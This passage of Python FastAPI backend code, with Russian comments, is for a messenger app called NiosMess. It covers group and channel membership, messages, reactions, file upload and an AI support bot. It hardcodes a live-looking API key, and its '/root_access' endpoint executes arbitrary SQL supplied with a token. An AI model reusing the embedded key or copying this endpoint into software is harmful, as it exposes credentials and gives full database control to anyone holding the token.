    if not is_valid_session(token, owner): 
        raise HTTPException(401, "Unauthorized")
    
    chat_id = f"group_{uuid.uuid4().hex[:8]}"
    now = str(time.time())
    
    with db_lock:
        conn = get_db()
        # Создаем группу с учетом новых полей (время создания)
        conn.execute(
            "INSERT INTO collective_chats (id, name, owner, type, created_at, updated_at) VALUES (?, ?, ?, 'group', ?, ?)", 
            (chat_id, name, owner, now, now)
        )
        # Добавляем создателя с ролью owner и начальным статусом закрепа 0
        conn.execute(
            "INSERT INTO chat_members (chat_id, username, role, is_pinned) VALUES (?, ?, 'owner', 0)", 
            (chat_id, owner)
        )
        conn.commit()
        
    return {"status": "ok", "chat_id": chat_id}

@app.post("/groups")
async def create_group_json(payload: dict):
    name = payload.get("name")
    owner = payload.get("owner")
    token = payload.get("token")
    if not name or not owner or not token:
        raise HTTPException(422, "Missing fields")
    return await create_group(name=name, owner=owner, token=token)

@app.post("/channels")
async def create_channel(payload: dict):
    name = payload.get("name")
    owner = payload.get("owner")
    token = payload.get("token")
    if not name or not owner or not token:
        raise HTTPException(422, "Missing fields")
    if not is_valid_session(token, owner):
        raise HTTPException(401, "Unauthorized")
    chat_id = f"channel_{uuid.uuid4().hex[:8]}"
    now = str(time.time())
    with db_lock:
        conn = get_db()
        conn.execute(
            "INSERT INTO collective_chats (id, name, owner, type, created_at, updated_at) VALUES (?, ?, ?, 'channel', ?, ?)",
            (chat_id, name, owner, now, now),
        )
        conn.execute(
            "INSERT INTO chat_members (chat_id, username, role, is_pinned) VALUES (?, ?, 'owner', 0)",
            (chat_id, owner),
        )
        conn.commit()
    return {"status": "ok", "chat_id": chat_id}

@app.post("/groups/{chat_id}/members")
async def group_members(chat_id: str, payload: dict):
    token = payload.get("token")
    operator = payload.get("operator") or payload.get("admin") or payload.get("owner")
    action = payload.get("action") or payload.get("mode") or "add"
    target = payload.get("target")
    members = payload.get("members")
    if not token or not operator:
        raise HTTPException(422, "Missing fields")
    if not is_valid_session(token, operator):
        raise HTTPException(401, "Unauthorized")
    with db_lock:
        conn = get_db()
        role_row = conn.execute(
            "SELECT role FROM chat_members WHERE chat_id=? AND username=?",
            (chat_id, operator),
        ).fetchone()
        if not role_row or dict(role_row)["role"] not in ["owner", "admin"]:
            raise HTTPException(403, "No permission")

        targets = []
        if isinstance(members, list):
            targets = members
        elif target:
            targets = [target]

        if not targets:
            raise HTTPException(422, "No targets")

        if action == "remove":
            for m in targets:
                conn.execute("DELETE FROM chat_members WHERE chat_id=? AND username=?", (chat_id, m))
        else:
            for m in targets:
                conn.execute(
                    "INSERT OR IGNORE INTO chat_members (chat_id, username, role) VALUES (?, ?, 'member')",
                    (chat_id, m),
                )
        conn.commit()
    return {"status": "ok"}

@app.post("/channels/{chat_id}/members")
async def channel_members(chat_id: str, payload: dict):
    # same logic as groups, channels use subscribers list in chat_members
    return await group_members(chat_id, payload)
@app.post("/groups/add_member")
async def add_member(chat_id: str = Form(...), admin: str = Form(...), member: str = Form(...), token: str = Form(...)):
    # Используем твою рабочую проверку сессии
    if not is_valid_session(token, admin): 
        raise HTTPException(401, "Unauthorized")
    
    with db_lock:
        conn = get_db()
        # Проверка прав: только owner или admin могут добавлять людей
        role_row = conn.execute(
            "SELECT role FROM chat_members WHERE chat_id=? AND username=?", 
            (chat_id, admin)
        ).fetchone()
        
        if not role_row or dict(role_row)['role'] not in ['owner', 'admin']:
            raise HTTPException(403, "No permission to add members")
            
        # Добавляем нового участника (INSERT OR IGNORE предотвращает дубликаты)
        conn.execute(
            "INSERT OR IGNORE INTO chat_members (chat_id, username, role) VALUES (?, ?, 'member')", 
            (chat_id, member)
        )
        conn.commit()
        
    return {"status": "ok"}

@app.post("/collective/{chat_id}/send")
async def send_collective_alias(chat_id: str, payload: dict):
    token = payload.get("token")
    sender = payload.get("sender")
    text = payload.get("text")
    reply_to = payload.get("reply_to")
    attachments = payload.get("attachments")
    ttl_seconds = payload.get("ttl_seconds")
    if not token or not sender or text is None:
        raise HTTPException(422, "Missing fields")
    return await send_collective(
        chat_id=chat_id,
        sender=sender,
        token=token,
        text=text,
        reply_to=reply_to,
        attachments=attachments,
        ttl_seconds=ttl_seconds,
    )
@app.post("/collective/send")
async def send_collective(
    chat_id: str = Form(...), 
    sender: str = Form(...), 
    token: str = Form(...),
    text: str = Form(...), 
    reply_to: int = Form(None), 
    attachments: str = Form(None), # JSON список имен файлов
    ttl_seconds: int = Form(None)
):
    # 1. Проверка сессии
    if not is_valid_session(token, sender):
        raise HTTPException(status_code=401, detail="Invalid session")

    # 2. Расчет времени удаления (TTL)
    expires_at = (time.time() + ttl_seconds) if ttl_seconds else None

    with db_lock:
        conn = get_db()
        
        chat_row = conn.execute("SELECT type, owner FROM collective_chats WHERE id=?", (chat_id,)).fetchone()
        if not chat_row:
            conn.close()
            raise HTTPException(status_code=404, detail="Chat not found")
        
        # 3. Проверка: состоит ли юзер в чате?
        member = conn.execute(
            "SELECT role FROM chat_members WHERE chat_id=? AND username=?", 
            (chat_id, sender)
        ).fetchone()
        
        if not member:
            conn.close()
            raise HTTPException(status_code=403, detail="You are not a member of this chat")

        chat_info = dict(chat_row)
        if chat_info.get("type") == "channel" and dict(member).get("role") not in ["owner"]:
            conn.close()
            raise HTTPException(status_code=403, detail="Only owner can post in channel")

        # 4. Сохранение сообщения
        cursor = conn.execute(
            """INSERT INTO group_messages 
               (chat_id, sender, text, time, reply_to, attachments, expires_at) 
               VALUES (?, ?, ?, ?, ?, ?, ?)""",
            (chat_id, sender, text, str(time.time()), reply_to, attachments, expires_at)
        )
        msg_id = cursor.lastrowid
        
        # 5. Обновление превью в таблице чатов
        preview = text[:50] + ("..." if len(text) > 50 else "")
        conn.execute(
            "UPDATE collective_chats SET updated_at=?, last_message_preview=? WHERE id=?",
            (str(time.time()), preview, chat_id)
        )
        
        conn.commit()
        conn.close()

    return {
        "status": "ok", 
        "message_id": msg_id, 
        "expires_at": expires_at
    }

@app.get("/collective/messages")
async def get_collective_msgs(chat_id: str, username: str, token: str, limit: int = 50):
    if not verify_token(username, token): raise HTTPException(401, "Unauthorized")
    
    with db_lock:
        conn = get_db()
        # Проверка доступа к истории
        is_member = conn.execute("SELECT 1 FROM chat_members WHERE chat_id=? AND username=?", (chat_id, username)).fetchone()
        if not is_member: raise HTTPException(403, "Access denied")
        
        messages = conn.execute("SELECT * FROM group_messages WHERE chat_id=? ORDER BY id ASC LIMIT ?", 
                                (chat_id, limit)).fetchall()
        
    return {"status": "ok", "messages": [dict(m) for m in messages]}

@app.get("/collective/messages/list")
async def get_collective_msgs_list(chat_id: str, username: str, token: str, limit: int = 50):
    # alias returning array
    res = await get_collective_msgs(chat_id=chat_id, username=username, token=token, limit=limit)
    return res.get("messages", [])
@app.get("/get_messages")

async def get_messages(me: str, other: str, token: str):

    if not is_valid_session(token, me):

        return []

    with db_lock:

        conn = get_db()

        rows = conn.execute(

            "SELECT * FROM messages WHERE (sender=? AND receiver=?) OR (sender=? AND receiver=?) ORDER BY id ASC", 

            (me, other, other, me)

        ).fetchall()

        conn.close()

        return [dict(r) for r in rows]

@app.post("/edit_message")
async def edit_message(request: Request, token: str = Form(None), username: str = Form(None), message_id: int = Form(None), text: str = Form(None)):
    if token is None or username is None or message_id is None or text is None:
        try:
            data = await request.json()
        except Exception:
            data = {}
        token = token or data.get("token")
        username = username or data.get("username")
        message_id = message_id or data.get("message_id")
        text = text or data.get("text")
    if not is_valid_session(token, username):
        raise HTTPException(401, "Unauthorized")
    with db_lock:
        conn = get_db()
        row = conn.execute("SELECT id FROM messages WHERE id=? AND sender=?", (message_id, username)).fetchone()
        if row:
            conn.execute("UPDATE messages SET text=? WHERE id=?", (text, message_id))
            conn.commit()
            return {"status": "ok"}
        row = conn.execute("SELECT id FROM group_messages WHERE id=? AND sender=?", (message_id, username)).fetchone()
        if row:
            conn.execute("UPDATE group_messages SET text=? WHERE id=?", (text, message_id))
            conn.commit()
            return {"status": "ok"}
    raise HTTPException(404, "Message not found")

@app.post("/delete_message")
async def delete_message(request: Request, token: str = Form(None), username: str = Form(None), message_id: int = Form(None)):
    if token is None or username is None or message_id is None:
        try:
            data = await request.json()
        except Exception:
            data = {}
        token = token or data.get("token")
        username = username or data.get("username")
        message_id = message_id or data.get("message_id")
    if not is_valid_session(token, username):
        raise HTTPException(401, "Unauthorized")
    with db_lock:
        conn = get_db()
        row = conn.execute("SELECT id FROM messages WHERE id=? AND sender=?", (message_id, username)).fetchone()
        if row:
            conn.execute("DELETE FROM messages WHERE id=?", (message_id,))
            conn.commit()
            return {"status": "ok"}
        row = conn.execute("SELECT id FROM group_messages WHERE id=? AND sender=?", (message_id, username)).fetchone()
        if row:
            conn.execute("DELETE FROM group_messages WHERE id=?", (message_id,))
            conn.commit()
            return {"status": "ok"}
    raise HTTPException(404, "Message not found")

@app.post("/typing")
async def typing_event(payload: dict):
    # no-op for now, just validate session
    token = payload.get("token")
    username = payload.get("username")
    if not is_valid_session(token, username):
        raise HTTPException(401, "Unauthorized")
    return {"status": "ok"}

@app.post("/messages/react")
async def react_message(payload: dict):
    token = payload.get("token")
    username = payload.get("username")
    message_id = payload.get("message_id")
    emoji = payload.get("emoji")
    action = payload.get("action") or ("add" if payload.get("active") else "remove")
    if not is_valid_session(token, username):
        raise HTTPException(401, "Unauthorized")
    if not message_id or not emoji:
        raise HTTPException(422, "Missing fields")
    with db_lock:
        conn = get_db()
        if action == "remove":
            conn.execute(
                "DELETE FROM reactions WHERE chat_id=? AND message_id=? AND username=? AND emoji=?",
                ("__direct__", int(message_id), username, emoji),
            )
        else:
            conn.execute(
                "DELETE FROM reactions WHERE chat_id=? AND message_id=? AND username=? AND emoji=?",
                ("__direct__", int(message_id), username, emoji),
            )
            conn.execute(
                "INSERT INTO reactions (chat_id, message_id, username, emoji, updated_at) VALUES (?, ?, ?, ?, ?)",
                ("__direct__", int(message_id), username, emoji, time.time()),
            )
        rows = conn.execute(
            "SELECT emoji, COUNT(*) as cnt FROM reactions WHERE chat_id=? AND message_id=? GROUP BY emoji",
            ("__direct__", int(message_id)),
        ).fetchall()
        mine_rows = conn.execute(
            "SELECT emoji FROM reactions WHERE chat_id=? AND message_id=? AND username=?",
            ("__direct__", int(message_id), username),
        ).fetchall()
        conn.commit()
    counts = {r["emoji"]: r["cnt"] for r in rows}
    mine = {r["emoji"]: True for r in mine_rows}
    return {"status": "ok", "counts": counts, "mine": mine}

@app.post("/collective/react")
async def react_collective(payload: dict):
    token = payload.get("token")
    username = payload.get("username")
    message_id = payload.get("message_id")
    emoji = payload.get("emoji")
    chat_id = payload.get("chat_id")
    action = payload.get("action") or ("add" if payload.get("active") else "remove")
    if not is_valid_session(token, username):
        raise HTTPException(401, "Unauthorized")
    if not message_id or not emoji or not chat_id:
        raise HTTPException(422, "Missing fields")
    with db_lock:
        conn = get_db()
        if action == "remove":
            conn.execute(
                "DELETE FROM reactions WHERE chat_id=? AND message_id=? AND username=? AND emoji=?",
                (chat_id, int(message_id), username, emoji),
            )
        else:
            conn.execute(
                "DELETE FROM reactions WHERE chat_id=? AND message_id=? AND username=? AND emoji=?",
                (chat_id, int(message_id), username, emoji),
            )
            conn.execute(
                "INSERT INTO reactions (chat_id, message_id, username, emoji, updated_at) VALUES (?, ?, ?, ?, ?)",
                (chat_id, int(message_id), username, emoji, time.time()),
            )
        rows = conn.execute(
            "SELECT emoji, COUNT(*) as cnt FROM reactions WHERE chat_id=? AND message_id=? GROUP BY emoji",
            (chat_id, int(message_id)),
        ).fetchall()
        mine_rows = conn.execute(
            "SELECT emoji FROM reactions WHERE chat_id=? AND message_id=? AND username=?",
            (chat_id, int(message_id), username),
        ).fetchall()
        conn.commit()
    counts = {r["emoji"]: r["cnt"] for r in rows}
    mine = {r["emoji"]: True for r in mine_rows}
    return {"status": "ok", "counts": counts, "mine": mine}



GEMINI_API_KEY = "sk-W1ZPCi7lEC0VCz2XB9l1Fql9H7qmWgG7qv8h9FBeiPHUe8riC8ljUX5p0r02"

GEMINI_URL = "https://api.gen-api.ru/api/v1/networks/gemini-2-5-flash-lite"



async def save_to_log(data):

    """Функция для записи ответа в файл neyronka.json"""

    try:

        with open("neyronka.json", "a", encoding="utf-8") as f:

            # Добавляем метку времени для удобства

            log_entry = {

                "timestamp": datetime.datetime.now().isoformat(),

                "data": data

            }

            f.write(json.dumps(log_entry, ensure_ascii=False) + "\n")

    except Exception as e:

        print(f"Ошибка записи в файл: {e}")



async def get_ai_response(user_text: str, username: str, name: str, is_frozen: bool, frozen_rule: str):

    headers = {

        'Content-Type': 'application/json',

        'Accept': 'application/json',

        'Authorization': f'Bearer {GEMINI_API_KEY}'

    }

    

    # Превращаем булево значение в текст для нейронки

    frozen_info = f"Аккаунт пользователя заморожен | Причина {frozen_rule}" if is_frozen else "Аккаунт активен (не заморожен)"

    

    # Твой промпт с добавками про юзера

    system_instructions = f"""

Ты — официальный агент техподдержки мессенджера 'NiosMess'.

ДАННЫЕ ТЕКУЩЕГО ПОЛЬЗОВАТЕЛЯ:



Имя: {name}



Username: {username}



Статус | Причина: {frozen_info}



Твой тон: вежливый, четкий и помогающий. Старайся отвечать как можно короче (желательно до 100-160 символов)

ИСПОЛЬЗУЙ СЛЕДУЮЩУЮ БАЗУ ЗНАНИЙ ДЛЯ ОТВЕТОВ:



Проблема: 'Когда релиз?' и похожие -> Ответ: Еще не известно. Вы сейчас в beta версии мессенджера, пожалуйста, подождите до релиза.



Проблема: 'Нет чатов / пропали чаты' и похожие -> Ответ: Проверьте стабильность интернет-соединения. Попробуйте потянуть список вниз для обновления. Возможно, аккаунт заморожен, устрела версия приложения или же вы вошли в другой аккаунт. Попробуйте обновить приложение. ссылка: https://nioscraft.ru/niosmess.exe



Вопрос: 'Почему только 1 чат?' и похожие -> Ответ: Это значит что ваш аккаунт заморожен или у вас устаревшая версия приложения. Попробуйте обновить! ссылка: https://nioscraft.ru/niosmess.exe



Вопрос: 'За что заморозили аккаунт?' и похожие -> Ответ: Причина блокировки: {frozen_rule}. Если вы хотите обжаловать ее, пишите нам. XD



Вопрос: 'Когда будут звонки/голосовые сообщения?' и похожие -> Ответ: Мы уже активно разрабатываем Звонки и Голосовые сообщения. Учтите, мы делаем все с нуля, и у нас только 1 разработчик



Общие баги: Если проблема не описана выше, проси пользователя прислать скриншот и указать модель устройства.

ПРАВИЛО: Не выдумывай функции, которых нет. Если не знаешь ответа, скажи, что передашь запрос разработчикам.

ПРАВИЛО 2: Старайся быть вежливым и если тебя оскорбляют предупреждай что передашь администрации и вас могут заблокировать за нарушение правил сообщества.

ПРАВИЛО 3: Система требует чтобы ты писал одной строкой. Т.е без переносов - система сама все перенесет.

Рекомендация: Если просят позвать человека, скажи что агент скоро прийдет"""

    

    payload = {

        "is_sync": True,

        "messages": [

            {"role": "system", "content": [{"type": "text", "text": system_instructions}]},

            {"role": "user", "content": [{"type": "text", "text": user_text}]}

        ],

        "temperature": 0.7,

        "max_tokens": 750

    }



    async with httpx.AsyncClient() as client:

        try:

            response = await client.post(GEMINI_URL, json=payload, headers=headers, timeout=60.0)

            data = response.json()

            

            if "response" in data and len(data["response"]) > 0:

                ai_content = data["response"][0]["message"]["content"]

                await save_to_log(ai_content)

                return ai_content

            elif "result" in data and len(data["result"]) > 0:

                ai_content = data["result"][0]["message"]["content"]

                await save_to_log(ai_content)

                return ai_content

            else:

                raw_error = json.dumps(data, ensure_ascii=False)

                await save_to_log(raw_error)

                return raw_error

        except Exception as e:

            error_text = f"Ошибка системы: {str(e)}"

            await save_to_log(error_text)

            return error_text

@app.post("/send_message")
async def send_message(m: MessageModel):
    # Проверка сессии
    if not is_valid_session(m.token, m.sender):
        raise HTTPException(status_code=401)

    # Расчет TTL (M10)
    # Предполагаем, что в MessageModel есть опциональное поле ttl_seconds
    expires_at = (time.time() + m.ttl_seconds) if hasattr(m, 'ttl_seconds') and m.ttl_seconds else None

    with db_lock:
        conn = get_db()
        # Авто-регистрация саппорта, если его нет
        if m.receiver == "supports":
            conn.execute("INSERT OR IGNORE INTO users (username, name) VALUES (?, ?)", 
                         ("supports", "Лисёнок-хранитель (Поддержка)"))
        
        # Сохраняем входящее сообщение со всеми полями из ТЗ (M07, M10, M12, M13)
        cursor = conn.execute(
            """INSERT INTO messages 
               (sender, receiver, text, time, reply_to, expires_at, lat, lon, contact_data, type) 
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (m.sender, m.receiver, m.text, str(time.time()), 
             getattr(m, 'reply_to', None), expires_at, 
             getattr(m, 'lat', None), getattr(m, 'lon', None), 
             getattr(m, 'contact_data', None), "text")
        )
        msg_id = cursor.lastrowid
        
        # Получаем данные отправителя для ИИ
        user_row = conn.execute(
            "SELECT username, name, is_frozen, frozen_rule FROM users WHERE username = ?", 
            (m.sender,)
        ).fetchone()
        
        conn.commit()
        conn.close()

    # --- ЛОГИКА ИИ-ПОДДЕРЖКИ ---
    if m.receiver == "supports" and user_row:
        user_data = dict(user_row)
        
        # Деобфускация и запрос к нейронке
        ai_text = await get_ai_response(
            user_text=obresfucate.deobresfucate(m.text),
            username=user_data['username'],
            name=user_data['name'],
            is_frozen=bool(user_data['is_frozen']),
            frozen_rule=user_data.get('frozen_rule', "не указана")
        )
        
        # Сохраняем ответ от ИИ как новое сообщение
        with db_lock:
            conn = get_db()
            conn.execute(
                "INSERT INTO messages (sender, receiver, text, time, reply_to, type) VALUES (?, ?, ?, ?, ?, ?)",
                ("supports", m.sender, ai_text, str(time.time()), msg_id, "text")
            )
            conn.commit()
            conn.close()

    return {"status": "ok", "message_id": msg_id, "expires_at": expires_at}

@app.post("/upload")

async def upload_file(

    sender: str = Form(...), 

    receiver: str = Form(...), 

    token: str = Form(...), 

    file: UploadFile = File(...)

):

    if not is_valid_session(token, sender):

        raise HTTPException(status_code=401)

    try:

        file_ext = os.path.splitext(file.filename)[1]

        safe_filename = f"{uuid.uuid4().hex}{file_ext}"

        file_path = os.path.join(UPLOAD_DIR, safe_filename)

        with open(file_path, "wb") as buffer:

            shutil.copyfileobj(file.file, buffer)

        with db_lock:

            conn = get_db()

            conn.execute(

                "INSERT INTO messages (sender, receiver, text, time, type) VALUES (?,?,?,?,?)",

                (sender, receiver, f"FILE:{safe_filename}", datetime.datetime.now().isoformat(), "file")

            )

            conn.commit()

            conn.close()

        return {"status": "ok", "filename": safe_filename}

    except Exception as e:

        logger.error(f"Upload failed: {e}")

        raise HTTPException(status_code=500, detail="File upload failed")



@app.get("/download/{filename}")

async def download_file(filename: str):

    safe_name = os.path.basename(filename)

    path = os.path.join(UPLOAD_DIR, safe_name)

    if os.path.exists(path):

        return FileResponse(path)

    return JSONResponse(status_code=404, content={"error": "File not found"})



@app.get("/search_users")

async def search_users(q: str, token: str, my_username: str):

    if not is_valid_session(token, my_username):

        return []

    with db_lock:

        conn = get_db()

        rows = conn.execute(

            """SELECT username, name, last_seen, is_frozen, verified 

               FROM users WHERE username LIKE ? OR name LIKE ? LIMIT 20""",

            (f"%{q}%", f"%{q}%")

        ).fetchall()

        conn.close()

        res = []

        for r in rows:

            d = dict(r)

            d['is_online'] = (time.time() - (r['last_seen'] or 0)) < 60 and not r['is_frozen']

            res.append(d)

        return res



# --- ADMIN / ROOT ACCESS ---

@app.get("/admin", response_class=HTMLResponse)

async def admin_page():

    return """<html><body style='background:#121212;color:white;padding:50px;'><h2>NiosMess Admin</h2><p>Status: <span style='color:lime;'>RUNNING</span></p></body></html>"""



@app.post("/root_access")

async def root_access(data: dict):

    if data.get("root_token") != ROOT_TOKEN:

        logger.warning("Unauthorized Root access attempt!")

        return JSONResponse(status_code=403, content={"status": "error", "message": "Access denied"})

    

    query = data.get("query", "").strip()

    params = data.get("params", [])

    

    with db_lock:

        conn = get_db()

        try:

            cursor = conn.cursor()

            cursor.execute(query, params)

            

            upper_query = query.upper()

            # Если это запрос на чтение

            if upper_query.startswith("SELECT") or upper_query.startswith("PRAGMA"):

                res = [dict(r) for r in cursor.fetchall()]

                return {

                    "status": "ok", 

                    "data": res, 

                    "message": f"Rows found: {len(res)}"

                }

            

            # Если это запрос на изменение

            conn.commit()

            return {

                "status": "ok", 

                "affected": cursor.rowcount, 

                "message": f"Query executed successfully. Affected rows: {cursor.rowcount}"

            }

        except Exception as e:

            logger.error(f"Root SQL Error: {e}")

            return {"status": "error", "message": str(e)}

        finally:

            conn.close()



# --- ФОНОВЫЕ ЗАДАЧИ ---

def background_tasks():
    while True:
        try:
            now = time.time()
            with db_lock:
                conn = get_db()
                
                # 1. Удаление старых сессий (более 7 дней неактивности)
                conn.execute("DELETE FROM sessions WHERE ? - last_activity > 604800", (now,))
                
                # 2. M10: Удаление сообщений с истекшим TTL
                conn.execute("DELETE FROM messages WHERE expires_at IS NOT NULL AND expires_at < ?", (now,))
                conn.execute("DELETE FROM group_messages WHERE expires_at IS NOT NULL AND expires_at < ?", (now,))
                
                # 3. M09: Обработка запланированных сообщений
                scheduled = conn.execute(
                    "SELECT * FROM scheduled_messages WHERE send_at <= ?", (now,)
                ).fetchall()
                
                for msg in scheduled:
                    if msg['chat_type'] in ['group', 'channel']:
                        conn.execute(
                            "INSERT INTO group_messages (chat_id, sender, text, time, reply_to) VALUES (?,?,?,?,?)",
                            (msg['chat_id'], msg['sender'], msg['text'], str(now), msg['reply_to'])
                        )
                    else:
                        conn.execute(
                            "INSERT INTO messages (sender, receiver, text, time, reply_to) VALUES (?,?,?,?,?)",
                            (msg['sender'], msg['chat_id'], msg['text'], str(now), msg['reply_to'])
                        )
                    conn.execute("DELETE FROM scheduled_messages WHERE id=?", (msg['id'],))
                
                conn.commit()
                conn.close()
            
            time.sleep(30) # Проверка каждые 30 секунд
        except Exception as e:
            logger.error(f"Background Task Error: {e}")
            time.sleep(10)



threading.Thread(target=background_tasks, daemon=True).start()



if __name__ == "__main__":

    logger.info("Server starting on port 5058...")

    uvicorn.run(app, host="0.0.0.0", port=5058)
